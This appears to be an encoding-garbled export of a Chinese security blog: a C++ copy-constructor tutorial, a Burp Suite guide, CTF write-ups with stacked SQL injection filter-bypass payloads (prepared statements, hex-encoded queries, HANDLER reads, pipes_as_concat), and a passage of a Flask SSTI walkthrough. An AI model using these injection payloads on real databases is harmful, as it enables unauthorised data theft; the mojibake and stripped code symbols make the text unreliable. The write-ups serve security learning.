æ³¨ï¼šæµ…æ‹·è´ä¸¤ä¸ªå¯¹è±¡å…±äº«åŒä¸€ä¸ªå†…å­˜ç©ºé—´ï¼Œå¯¼è‡´ä¸€ä¸ªå¯¹è±¡è¢«ææ„æ—¶ï¼Œå¦ä¸€ä¸ªå¯¹è±¡å¯èƒ½ä¼šè®¿é—®å·²åˆ é™¤çš„å†…å­˜ #include iostreamusing namespace std;class Shallowpublic: int *data; // æ„é€ å‡½æ•° Shallow(int value) data = new int(value); // æµ…æ‹·è´æ„é€ å‡½æ•° Shallow(const Shallow other) data = other.data; // åªæ˜¯å¤åˆ¶æŒ‡é’ˆï¼Œè€Œä¸æ˜¯æ•°æ® // ææ„å‡½æ•° ~Shallow() delete data; // åˆ é™¤å†…å­˜ï¼Œä½†åœ¨æµ…æ‹·è´æ—¶å¯èƒ½ä¼šå¼•å‘é”™è¯¯ ;int main() Shallow obj1(10); // åˆ›å»º obj1 Shallow obj2 = obj1; // æµ…æ‹·è´ obj1 åˆ° obj2 cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; // ç”±äº obj1 å’Œ obj2 éƒ½æŒ‡å‘åŒä¸€å†…å­˜åŒºåŸŸï¼Œé”€æ¯ä¸€ä¸ªå¯¹è±¡æ—¶ä¼šå¯¼è‡´é—®é¢˜ return 0; å½“ obj1 æˆ– obj2 è¢«é”€æ¯æ—¶ï¼Œdata æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ä¼šè¢«åˆ é™¤ï¼Œå¯¼è‡´å¦ä¸€ä¸ªå¯¹è±¡è®¿é—®å·²é‡Šæ”¾çš„å†…å­˜ï¼Œææ„ä¸¤æ¬¡ä¼šé€ æˆç¨‹åºçš„å¥”æºƒ æ·±æ‹·è´ æ·±æ‹·è´ = è‡ªå·±å†™æ‹·è´æ„é€ å‡½æ•°ï¼Œåˆ†é…æ–°å†…å­˜å¹¶å¤åˆ¶å†…å®¹ å¤§ç™½è¯ï¼šå¢åŠ ä¸€ä¸ªæŒ‡é’ˆå¹¶ä¸”ç”³è¯·äº†ä¸€ä¸ªæ–°çš„å†…å­˜ï¼Œä½¿è¿™ä¸ªå¢åŠ çš„æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªæ–°çš„å†…å­˜ æœ‰æŒ‡é’ˆã€æ•°ç»„ã€åŠ¨æ€èµ„æºæ—¶å¿…é¡»ä½¿ç”¨ #include iostreamusing namespace std;class Deep public: int *data; // æ„é€ å‡½æ•° Deep(int value) data = new int(value); // æ·±æ‹·è´æ„é€ å‡½æ•° Deep(const Deep other) data = new int(*other.data); // åˆ†é…æ–°çš„å†…å­˜å¹¶å¤åˆ¶æ•°æ® // ææ„å‡½æ•° ~Deep() delete data; // æ­£å¸¸åˆ é™¤å†…å­˜ /*public: char *data; // æ„é€ å‡½æ•° Deep(const char *value) data = new char[strlen(value) + 1]; // åˆ†é…å†…å­˜ strcpy(data, value); // å¤åˆ¶å­—ç¬¦ä¸² // æ·±æ‹·è´æ„é€ å‡½æ•° Deep(const Deep other) // ä¸ºæ–°å¯¹è±¡åˆ†é…æ–°çš„å†…å­˜ç©ºé—´ data = new char[strlen(other.data) + 1]; strcpy(data, other.data); // æ‹·è´æ•°æ® // ææ„å‡½æ•° ~Deep() delete[] data; // åˆ é™¤åŠ¨æ€åˆ†é…çš„å†…å­˜ */;int main() Deep obj1(10); // åˆ›å»º obj1 Deep obj2 = obj1; // æ·±æ‹·è´ obj1 åˆ° obj2 cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; // ä¿®æ”¹ obj2 ä¸­çš„æ•°æ® *obj2.data = 20; cout After modification: std::endl; cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; return 0; è¾“å‡ºï¼š obj1.data: 10obj2.data: 10After modification:obj1.data: 10obj2.data: 20 å‚è€ƒï¼š ã€C++ã€‘æ·±åº¦è§£æâ€“æ‹·è´æ„é€ å‡½æ•° ã€C++ | æ‹·è´æ„é€ å‡½æ•°ã€‘ä¸€æ–‡äº†è§£C++çš„ æ‹·è´(å¤åˆ¶)æ„é€ å‡½æ•°","tags":["ç¼–ç¨‹"],"categories":["ç¼–ç¨‹"]},{"title":"BurpSuitçš„ä½¿ç”¨","path":"/2025/07/09/BurpSuitçš„ä½¿ç”¨/","content":"BurpSuitçš„ä½¿ç”¨ Burp Suiteç”¨äºè¯†åˆ«å’Œåˆ©ç”¨Webåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ åŒ…æ‹¬ä»£ç†æœåŠ¡å™¨ã€æ‰«æå™¨ã€å…¥ä¾µè€…ã€é‡å¤å™¨ã€æ’åºå™¨ã€è§£ç å™¨ï¼ˆå¯ä»¥ç”¨äºæ‹¦æˆªå’Œä¿®æ”¹HTTPè¯·æ±‚å’Œå“åº”ï¼Œæ‰§è¡Œè‡ªåŠ¨åŒ–æ¼æ´æ‰«æã€æš´åŠ›ç ´è§£æ”»å‡»ç­‰ï¼‰ ä»£ç†æ¨¡å—(porxy) æ‹¦æˆªã€ä¿®æ”¹HTTP/HTTPSè¯·æ±‚å’Œå“åº” å…è®¸ç”¨æˆ·åœ¨å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ä¹‹å‰æ‰‹åŠ¨ä¿®æ”¹è¯·æ±‚å†…å®¹ï¼ˆæµ‹è¯•æ¼æ´ç±»å‹ï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰å’ŒSQLæ³¨å…¥ï¼‰ Intercept(æ‹¦æˆª) Iå…è®¸ç”¨æˆ·æ‹¦æˆªåº”ç”¨ç¨‹åºçš„HTTPå’ŒHTTPSè¯·æ±‚ï¼ŒæŸ¥çœ‹å’Œä¿®æ”¹è¯·æ±‚ï¼Œç„¶åè½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ä½¿ç”¨Interceptï¼Œç”¨æˆ·å¯ä»¥æ·±å…¥åˆ†æåº”ç”¨ç¨‹åºçš„è¯·æ±‚å’Œå“åº”ï¼Œå¹¶æŸ¥æ‰¾æ½œåœ¨çš„æ¼æ´ã€å¿«é€ŸéªŒè¯æ¼æ´çš„åˆ©ç”¨ã€‚ é¦–å…ˆæˆ‘ä»¬è¦è¿›è¡ŒæˆåŠŸæŠ“åŒ…ï¼Œå¿…é¡»è¦å°†æµè§ˆå™¨çš„æµé‡åŒ…è½¬ç§»åˆ°burpsuitä¸Š ã€å®‰è£…SwitchyOmegaï¼ˆæµè§ˆå™¨ï¼‰,è¿›è¡Œå¿«é€Ÿä»£ç†ï¼ˆåˆ›å»ºä¸€ä¸ªBurpçš„æƒ…æ™¯æ¨¡å¼ï¼Œå¦‚ä¸‹å›¾ï¼‰ or æŠŠæµè§ˆå™¨çš„æµé‡è½¬å‘åˆ°8080ç«¯å£ ã€‘ HTTP history(HTTPè¯·æ±‚å†å²) è®°å½•äº†æ‰€æœ‰è¢«æ‹¦æˆªçš„è¯·æ±‚å’Œå“åº”ï¼Œç”¨æˆ·èƒ½æŸ¥çœ‹å’Œåˆ†æä»¥å‰çš„è¯·æ±‚å’Œå“åº”ï¼Œå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨æ¥æœç´¢ç‰¹å®šè¯·æ±‚å’Œå“åº”ï¼Œè½»æ¾åœ°æŸ¥æ‰¾å’Œåˆ†ææµé‡ WebSockets history ä¸€èˆ¬åªæœ‰å®æ—¶å¯¹è¯å¯ä»¥æŠ“åˆ° Optioné€‰é¡¹ é…ç½®Proxyç›‘å¬çš„ç«¯å£ï¼šå°†SwitchyOmegaçš„ä»£ç†æœåŠ¡å™¨è®¾ç½®æˆä¸æŠ“åŒ…çš„æ¥å£ä¸€æ · ç›®æ ‡æ¨¡å—(Target) ç”¨äºé…ç½®ç›®æ ‡åº”ç”¨ç¨‹åºå’ŒWebç«™ç‚¹ä¿¡æ¯çš„å·¥å…·ã€‚åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–æ¼æ´æ‰«ææ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ¨¡å—æ¥ç¡®å®šæ”»å‡»ç›®æ ‡å¹¶è®¾ç½®ä»£ç†ä»¥æ‹¦æˆªæµé‡ Site Map æä¾›å¯¹ç«™ç‚¹ç»“æ„å’Œå†…å®¹ï¼Œåˆ—å‡ºäº†ç«™ç‚¹çš„URLï¼Œä»¥åŠæ¯ä¸ªURLçš„HTTPå“åº”ä»£ç ã€è¯·æ±‚å’Œå“åº”å¤´ä¿¡æ¯ä»¥åŠå…¶ä»–å‚æ•° æ‰«ææ¨¡å—(Dashboard) æ‰§è¡Œè‡ªåŠ¨åŒ–æ¼æ´æ‰«æï¼ŒåŒ…æ‹¬SQLæ³¨å…¥ã€è·¨ç«™è„šæœ¬ç­‰å¤šç§æ¼æ´ å“åº”æ¨¡å—(Repeater) æ˜¾ç¤ºè¯·æ±‚å’Œå“åº”çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬HTTPå¤´å’Œæ­£æ–‡ åŠŸèƒ½ å¤åˆ¶è¯·æ±‚ï¼šå°†å·²ç»å‘é€çš„è¯·æ±‚å¤åˆ¶åˆ°Repeaterä¸­ï¼Œæ–¹ä¾¿è¿›è¡Œé‡æ”¾å’Œä¿®æ”¹ã€‚ ä¿®æ”¹æ•°æ®ï¼šå¯ä»¥å¯¹è¯·æ±‚ä¸­çš„å‚æ•°ã€è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚å¤´ç­‰è¿›è¡Œä¿®æ”¹ï¼Œä»è€Œå¿«é€Ÿå®šä½æ¼æ´ç‚¹ã€‚ æ‰‹åŠ¨å¡«å†™æ•°æ®ï¼šå¯ä»¥æ‰‹åŠ¨å¡«å†™å‚æ•°æ•°æ®ï¼Œä»¥ä¾¿å¯¹åº”ä¸åŒçš„æµ‹è¯•åœºæ™¯ã€‚ å‘é€è¯·æ±‚ï¼šæ–¹ä¾¿å¯¹ä¿®æ”¹åçš„è¯·æ±‚è¿›è¡Œé‡æ”¾ï¼Œçœ‹å“åº”æ˜¯å¦ç¬¦åˆé¢„æœŸã€‚ è¯·æ±‚åŒ… GET /index.php HTTP/1.1 Host: www.taeget.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signedexchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close è¯·æ±‚è¡Œ(è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚URLå’ŒHTTPåè®®ç‰ˆæœ¬) è¯·æ±‚æ–¹æ³•ï¼šå¸¸è§çš„HTTPè¯·æ±‚æ–¹æ³•æœ‰GETï¼ˆè¯·æ±‚è·å–èµ„æºï¼‰ã€POSTï¼ˆæäº¤è¡¨å•æ•°æ®ï¼‰ã€PUTï¼ˆæ›´æ–°èµ„æºï¼‰ã€DELETEï¼ˆåˆ é™¤èµ„æºï¼‰ è¯·æ±‚URLï¼š/index.php (æœ‰æ—¶URLä¼šçœç•¥) è¯·æ±‚å¤´éƒ¨ï¼ˆåŒ…å«äº†è¯·æ±‚çš„å„ç§é™„åŠ ä¿¡æ¯ï¼Œ å¦‚è¯·æ±‚çš„ä¸»æœºã€è¯·æ±‚çš„ç”¨æˆ·ä»£ç†ã€è¯·æ±‚çš„å†…å®¹ç±»å‹ç­‰ã€‚Hostå¤´ï¼ŒUser-Agentï¼ŒAcceptï¼ŒAccept-Encodingï¼ŒAccept-Languageï¼ŒCookieï¼‰ è¯·æ±‚ä½“ï¼šæœ‰äº›è¯·æ±‚éœ€è¦ä¼ é€’æ•°æ®ï¼Œè¿™äº›æ•°æ®éœ€è¦åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ï¼Œå¦‚POSTè¯·æ±‚å°±å¸¸å¸¸éœ€è¦åœ¨è¯·æ±‚ä½“ä¸­ä¼ é€’è¡¨å•æ•°æ® å“åº”åŒ… çŠ¶æ€è¡Œï¼šçŠ¶æ€è¡ŒåŒ…å«ä¸‰ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯HTTPåè®®ç‰ˆæœ¬ã€çŠ¶æ€ç å’ŒçŠ¶æ€æ¶ˆæ¯ çŠ¶æ€ç æ˜¯æŒ‡æœåŠ¡å™¨è¿”å›çš„å¤„ç†ç»“æœï¼ˆ200è¡¨ç¤ºæˆåŠŸã€404è¡¨ç¤ºèµ„æºä¸å­˜åœ¨ã€401è¡¨ç¤ºæœªæˆæƒã€30xè¡¨ç¤ºè·³è½¬ã€302è·³è½¬æ¼æ´ã€ 50xè¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼‰ å“åº”å¤´éƒ¨ï¼šåŒ…å«äº†å“åº”çš„å„ç§é™„åŠ ä¿¡æ¯ï¼ˆå“åº”çš„æ—¥æœŸã€å“åº”çš„å†…å®¹ç±»å‹ã€å“åº”çš„é•¿åº¦ï¼Œå“åº”Cookieï¼‰ å“åº”ä½“ï¼šåŒ…å«äº†æœåŠ¡å™¨è¿”å›çš„å®é™…æ•°æ®ï¼ˆHTMLã€JSONç­‰æ ¼å¼çš„æ•°æ®ï¼‰ é‡å¤æ¨¡å—(Intruder)çˆ†ç ´ å‘é€è¯·æ±‚çš„å¤šä¸ªå‰¯æœ¬ï¼Œä»¥æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨çš„å“åº”æ˜¯å¦ç›¸åŒï¼ˆå¸®åŠ©ç”¨æˆ·ç¡®å®šç›®æ ‡åº”ç”¨ç¨‹åºæ˜¯å¦å®¹æ˜“å—åˆ°é‡å¤æ”»å‡»çš„å½±å“ï¼‰ åŠŸèƒ½ 1.å°†ä¸åŒç±»å‹çš„æ•°æ®æœ‰æ•ˆè´Ÿè½½æ’å…¥åˆ°Webåº”ç”¨ç¨‹åºä¸­çš„å‚æ•°ä¸­ï¼Œå¹¶è‡ªåŠ¨åŒ–åœ°å‘èµ·è¯·æ±‚ï¼Œä»¥å°è¯•å‘ç°åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•æ¼æ´æˆ–å®‰å…¨é—®é¢˜ï¼ˆä½¿ç”¨Intruderæ¥æ‰§è¡Œå­—å…¸æ”»å‡»ã€æš´åŠ›ç ´è§£æˆ–SQLæ³¨å…¥ç­‰ä¸åŒç±»å‹çš„æ”»å‡»ï¼Œä»¥æµ‹è¯•Webåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ï¼‰ 2.æ”¯æŒå¯¹å¤šä¸ªç›®æ ‡åŒæ—¶è¿›è¡Œæ”»å‡»ï¼Œä»è€Œæé«˜æµ‹è¯•æ•ˆç‡ã€‚åœ¨æ”»å‡»å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨Burp Suiteçš„å…¶ä»–æ¨¡å—æ¥è¿›ä¸€æ­¥åˆ†ææ”»å‡»ç»“æœï¼Œå¹¶æŸ¥æ‰¾æˆåŠŸåˆ©ç”¨æ¼æ´çš„å¯èƒ½æ€§ Positionsï¼ˆä½ç½®ï¼‰ Intruderæ¨¡å—æ˜¯é€šè¿‡è¿›è¡ŒæŒ‡å®šå‚æ•°ï¼ˆusername=è¿›è¡ŒæŒ‡å®šå‚æ•°ï¼ˆusername=è¿›è¡ŒæŒ‡å®šå‚æ•°ï¼ˆusername=xxx$æ„æ€å°±æ˜¯å°†ä½ çš„å­—å…¸ä¼šå»æ›¿æ¢è¿™ä¸ªxxxçš„å€¼ï¼‰ æˆ‘ä»¬å…ˆå»clear$ ï¼ˆæ¸…ç©ºå½“è¯·æ±‚åŒ…å‘é€åˆ°Intruderæ¨¡å—æ˜¯è‡ªå¸¦çš„æ‰€æœ‰ï¼‰ï¼Œç„¶åå†é€šè¿‡addï¼‰ï¼Œç„¶åå†é€šè¿‡addï¼‰ï¼Œç„¶åå†é€šè¿‡add è¿›è¡Œæ·»åŠ å˜é‡å€¼ æµ‹è¯•æ¨¡å¼ Sniper ï¼ˆé€ä¸ªåœ°å¯¹æ¯ä¸ªç›®æ ‡å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œç”¨äºéœ€è¦å…·ä½“æŒ‡å®šæŸä¸ªå‚æ•°å€¼è¿›è¡Œæµ‹è¯•çš„æƒ…å†µï¼‰ çˆ†ç ´å•ä¸ªä½ç½®ï¼Œä½ æŒ‡å®šå“ªå°±çˆ†ç ´å“ªï¼ˆå¦‚ä¸åŒçš„ç”¨æˆ·åï¼Œå¯†ç ä¸å˜ä¸º1234560ï¼‰ Battering Ram ï¼ˆé€‰æ‹©å¤šä¸ªä¸åŒçš„å‚æ•°å€¼é›†åˆä½œä¸ºæµ‹è¯•æ•°æ®è¿›è¡Œå¹¶è¡Œæµ‹è¯•ï¼Œä»¥æ‰¾å‡ºæ‰€æœ‰å¯èƒ½çš„æ¼æ´ç‚¹ï¼Œé€‚ç”¨äºéœ€è¦å¤§é‡æµ‹è¯•æ•°æ®çš„æƒ…å†µï¼‰ æŒ‡å®šå¤šä¸ªä½ç½® ä»–åªéœ€è¦ä½ ä¸€ä¸ªå­—å…¸æ–‡ä»¶ï¼Œæ‰€æœ‰ä½ç½®çš„å‚æ•°ä¸€æ · Pitchfork åŒæ—¶å¯¹å¤šä¸ªå‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œå°†ä¸åŒçš„å‚æ•°ç»„åˆåœ¨ä¸€èµ·è¿›è¡Œæµ‹è¯•ï¼Œé€‚ç”¨äºéœ€è¦æµ‹è¯•å¤šä¸ªå‚æ•°äº¤äº’æƒ…å†µçš„æƒ…å†µ Cluster Bomb ä¼¼äºBattering Ramï¼Œä¸åŒä¹‹å¤„åœ¨äºå®ƒå°†å¤šä¸ªå‚æ•°å€¼é›†åˆä½œä¸ºæµ‹è¯•æ•°æ®ï¼Œä½†ä¼šå¯¹æ¯ä¸ªå‚æ•°é›†åˆéƒ½è¿›è¡Œé€æ¬¡çš„å•å…ƒç´ ç»„åˆæµ‹è¯•ï¼Œé€‚ç”¨äºéœ€è¦è¯¦ç»†æµ‹è¯•æ¯ä¸ªå‚æ•°å€¼çš„æƒ…å†µ Compareræ¨¡å— æ¯”è¾ƒæ¥è‡ªä¸¤ä¸ªHTTPè¯·æ±‚æˆ–å“åº”çš„æ•°æ®ï¼ŒæŸ¥æ‰¾æ½œåœ¨æ¼æ´æˆ–æ£€æµ‹åº”ç”¨ç¨‹åºä¸­çš„ä¸è‰¯è¡Œä¸ºï¼ˆå¦‚æœå¯¹åº”ç”¨ç¨‹åºæ‰§è¡Œäº†ä¸¤ä¸ªç›¸åŒçš„è¯·æ±‚ï¼Œä½†æ¯æ¬¡å“åº”éƒ½ç•¥æœ‰ä¸åŒï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ä½¿ç”¨æ¯”è¾ƒæ¨¡å—æ¥æŸ¥çœ‹å“åº”ä¹‹é—´çš„å·®å¼‚å¹¶ç¡®å®šç½‘ç«™æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜ï¼‰ æ”¯æŒé«˜çº§è¿‡æ»¤å™¨ï¼Œåœ¨æ¯”è¾ƒå¤§å‹å¤æ‚å“åº”æ—¶å¿«é€Ÿæ‰¾åˆ°å·®å¼‚ï¼Œå°†æ¯”è¾ƒç»“æœå¯¼å‡ºä¸ºæ–‡æœ¬æ–‡ä»¶ä»¥è¿›è¡Œåç»­åˆ†æ æ‹“å±•æ¨¡å— åŠ è½½å’Œç®¡ç†Burp Suiteçš„æ’ä»¶ï¼Œä»¥æ‰©å±•å…¶åŠŸèƒ½å’Œç‰¹æ€§ï¼ˆå¦‚ç›®å½•æšä¸¾ã€æš´åŠ›ç ´è§£ã€æ¼æ´æ£€æµ‹ã€ä»£ç†æœåŠ¡å™¨ï¼‰","tags":["CTFå·¥å…·","BurpSuit"],"categories":["CTFå·¥å…·","BurpSuit"]},{"title":"å¼ºç½‘æ¯2019éšä¾¿æ³¨","path":"/2025/07/09/[å¼ºç½‘æ¯-2019]éšä¾¿æ³¨/","content":"[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1 æ€»ç»“ è¡¨åæ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨åå¼•å·åŒ…è£¹ é€šå¸¸ä½¿ç”¨å †å æ³¨å…¥ç»“åˆé¢„ç¼–è¯‘æˆ–16è¿›åˆ¶ç¼–ç ç»•è¿‡select å½“selectã€unionã€å¤§å°å†™è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä½¿ç”¨handlerè¯­å¥ é¢˜ç›® è§£é¢˜æ€è·¯ é—­åˆæ–¹å¼ä¸º'æŠ¥é”™ï¼Œè¯´æ˜æ˜¯å­—ç¬¦å‹ å°è¯•1â€™ or1=1#ï¼ŒæˆåŠŸè¾“å‡ºäº†è¯¥è¡¨çš„æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯æ²¡æœ‰flagï¼Œè¯´æ˜flagä¸åœ¨å½“å‰æ•°æ®è¡¨ä¸­ åˆ¤æ–­ä¸€ä¸‹å­—æ®µä¸ªæ•°ï¼š' union select 1,2;# ç³»ç»Ÿæç¤ºreturn preg_match(/select|update|delete|drop|insert|where|\\./i,$inject); å¯ä»¥é€šè¿‡å †å æ³¨å…¥çš„æ–¹å¼ï¼Œæ¥ç»•è¿‡selectå…³é”®å­— æŸ¥æ‰¾æ•°æ®åï¼š 1;show databases;# æŸ¥çœ‹æ•°æ®è¡¨ï¼š1';show tables;# åˆ†åˆ«æŸ¥ä¸¤ä¸ªè¡¨ï¼Œå‘ç°ç¬¬ä¸€ä¸ªè¡¨1919810931114514ä¸‹æœ‰1flagåˆ— 1; show columns from `1919810931114514`;# æ³¨æ„ï¼šå¦‚æœè¡¨åæ˜¯çº¯æ•°å­—ï¼Œéœ€è¦ç”¨åå¼•å·åŒ…è£¹ æ³•ä¸€ é¢„ç¼–è¯‘çš„æ–¹å¼æ‹¼æ¥select å…³é”®å­— 1;sEt@a=concat(sel,ect flag from `1919810931114514`);PREPARE hacker from @a;EXECUTE hacker;# æ³•äºŒ 16è¿›åˆ¶ç¼–ç ç»•è¿‡select å…³é”®å­— select * from `1919810931114514` å°†ä¸Šè¿°è¯­å¥è¿›è¡Œ16è¿›åˆ¶ç¼–ç  1;sEt@a= 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @a;EXECUTE hacker;# æ³•ä¸‰ é€šè¿‡handlerç›´æ¥ç»™å‡ºç­”æ¡ˆ 1;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` READ NEXT;HANDLER `1919810931114514` CLOSE; å½“selectã€unionã€å¤§å°å†™è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä½¿ç”¨handlerè¯­å¥ å‚è€ƒï¼š [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1ã€SQLæ³¨å…¥ã€‘å››ç§è§£æ³•-çŸ¥ä¹","tags":["æ¼æ´","SQL","CTF"],"categories":["CTF"]},{"title":"(SUCTF 2019)EasySQL","path":"/2025/07/09/[SUCTF-2019]EasySQL/","content":"[SUCTF 2019]EasySQL æ€»ç»“ ç”¨BpæŠ“åŒ…çˆ†ç ´æŸ¥è¯¢è¿‡æ»¤çš„å…³é”®å­—ï¼Œæ‰¾åˆ°åˆé€‚çš„æ³¨å…¥æ–¹æ³• å°è¯•ç”¨é¢„ç¼–è¯‘ç»•è¿‡é™åˆ¶ å¯ç”¨set sql_mode=pipes_as_concatæ¨¡å¼ï¼Œå°†||è¿ç®—ç¬¦ç”¨ä½œå­—ç¬¦ä¸²è¿æ¥ï¼Œå³ç”¨ä½œconcat()å‡½æ•°åŒä¹‰è¯ é¢˜ç›® è§£é¢˜æ€è·¯ è¾“å…¥1ï¼Œå‡ºç°å›æ˜¾ï¼š å°è¯•å°† 1 å’Œ or ä¸€èµ·è¾“å…¥ï¼Œå³ 1 or 1=1 å‡ºç°å›æ˜¾ï¼š è¿™è¯´æ˜orè¢«è¿‡æ»¤äº† è¿™æ—¶æˆ‘ä»¬è¦æ£€æŸ¥å“ªäº›å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ¥åˆ¤æ–­æ³¨å…¥æ–¹å¼ ç”¨BpæŠ“åŒ…å†åˆ©ç”¨sqlå…³é”®å­—å­—å…¸å¯¹queryè¿›è¡Œçˆ†ç ´ å‘ç°è¿‡æ»¤ï¼ˆéƒ¨åˆ†ï¼‰ï¼š flag|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|floor|extractvalue|updatexml|or|and|| ç›²æ³¨ï¼Œè”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ä¸å¯ç”¨ï¼ å°è¯•å †å æ³¨å…¥ï¼šå°†å¤šæ¡SQLè¯­å¥æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶ç”¨åˆ†å·;éš”å¼€ æŸ¥æ•°æ®åº“å æŸ¥è¡¨å è¡¨Flagï¼Œå¯ä»¥ç¡®å®šflagåœ¨è¡¨Flagä¸­ æˆ‘ä»¬é¦–å…ˆæƒ³åˆ°åˆ©ç”¨fromæ¥æŸ¥è¯¢Flagï¼Œä½†æ˜¯é€šè¿‡æŠ“åŒ…åˆ†æå¯çŸ¥ï¼Œfromå…³é”®å­—è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥åªèƒ½å¦å¯»ä»–æ³• æ­£å¸¸è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨é¢„ç¼–è¯‘æ¥ç»•è¿‡é™åˆ¶ 1;sEt@a=concat(select * fr,om Flag);PRepare hello from @a;execute hello;# ä½†è¿‡æ»¤äº†prepareï¼Œå¤§å°å†™ç»•è¿‡ä¹Ÿä¸è¡Œ è¾“å…¥éé›¶æ•°å­—å¾—åˆ°ç»“æœä¸€ç›´æ˜¯1å’Œè€Œè¾“å…¥å…¶ä½™å­—ç¬¦çš„æ•°æ®å°±å¾—ä¸åˆ°å›æ˜¾=æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼ˆå³orï¼šæˆ–è¿ç®—ï¼‰ é»˜è®¤æƒ…å†µä¸‹åœ¨MySQLä¸­||è¿ç®—ç¬¦æ˜¯é€»è¾‘æˆ–è¿ç®—ç¬¦ï¼ˆå³orï¼‰ï¼Œä½†å–å†³äºPIPES_AS_CONCAT SQLæ¨¡å¼ å¦‚æœå¯ç”¨äº†set sql_mode=pipes_as_concatæ¨¡å¼ï¼Œåˆ™||è¿ç®—ç¬¦ç”¨ä½œå­—ç¬¦ä¸²è¿æ¥ï¼Œå³ç”¨ä½œconcat()å‡½æ•°åŒä¹‰è¯ é‚£ä¹ˆå†…ç½®è¯­å¥å°±å¯ä»¥çŒœæµ‹ä¸ºï¼šsql=select post[query] || flag from Flag; æŸ¥è¯¢è¯­å¥ï¼š 1;set sql_mode=pipes_as_concat;select 1 å¾—åˆ°flag ä¸€ç‚¹å°è¡¥å……ï¼š select concat('f','lag') from Flag; è¿™ç§ç»•è¿‡flagçš„æ€è·¯æ˜¯ä¸å¯¹çš„ å› ä¸ºè¿™ç§ä¼šå½“åšå…ˆselect 'f','lag' from Flag ç„¶åå†ä½¿ç”¨concatå°†få’Œlagè¿æ¥èµ·æ¥","tags":["æ¼æ´","SQL","CTF"],"categories":["CTF"]},{"title":"Buuctf [flask]SSTI","path":"/2025/07/09/[flask]SSTI 1/","content":"Buuctf [flask]SSTI é¢˜ç›®æè¿°ï¼š å…¸å‹çš„SSTIæ³¨å…¥é¡µé¢ï¼Œæˆ‘ä»¬è¾“å…¥49éªŒè¯ä¸€ä¸‹ å¯ä»¥ç¡®å®šä¸ºSSTIæ³¨å…¥æ¼æ´ è§£é¢˜æ€è·¯ï¼š 1.å…ˆè·å–ç±»ï¼š .__class__ å…ˆä½¿ç”¨è¯¥payloadæ¥è·å–æŸä¸ªç±»ï¼Œè¿™é‡Œå¯ä»¥è·å–åˆ°çš„æ˜¯strç±»ï¼Œå®é™…ä¸Šè·å–åˆ°ä»»ä½•ç±»éƒ½å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æœ€ç»ˆç›®çš„æ˜¯è¦è·å–åˆ°åŸºç±»Object 2.è·å–åŸºç±»ï¼š .__class__.__bases__ 3.è·å–åŸºç±»çš„æ‰€æœ‰å­ç±»ï¼š .__class__.__bases__.__subclasses__() import re# å°†æŸ¥æ‰¾åˆ°çš„å­ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­data = r [class type, class weakref, ......]userful_class = [linecache, os._wrap_close, subprocess.Popen, warnings.catch_warnings, _frozen_importlib._ModuleLock, _frozen_importlib._DummyModuleLock, _frozen_importlib._ModuleLockManager, _frozen_importlib.ModuleSpec]pattern = re.compile(r(.*?))class_list = re.findall(pattern, data)for c in class_list: for i in userful_class: if i in c: print(str(class_list.index(c)) + : + c) ç”¨ä¸Šè¿°è„šæœ¬æ‰¾å‡ºå¯ç”¨çš„ç±» è¿™é‡Œæœ‰3ä¸ªå¯ç”¨çš„ç±» os._wrap_close warnings.catch_warnings subprocess.Popen 4.åœ¨è¿™ä¸ªç±»ä¸­æ‰¾ä»–çš„åˆå§‹åŒ–å‡½æ•°é‡Œé¢çš„æ‰€æœ‰å…¨å±€å˜é‡ï¼ˆä»¥ä¸Šè¿°166ä¸ºä¾‹ï¼‰ 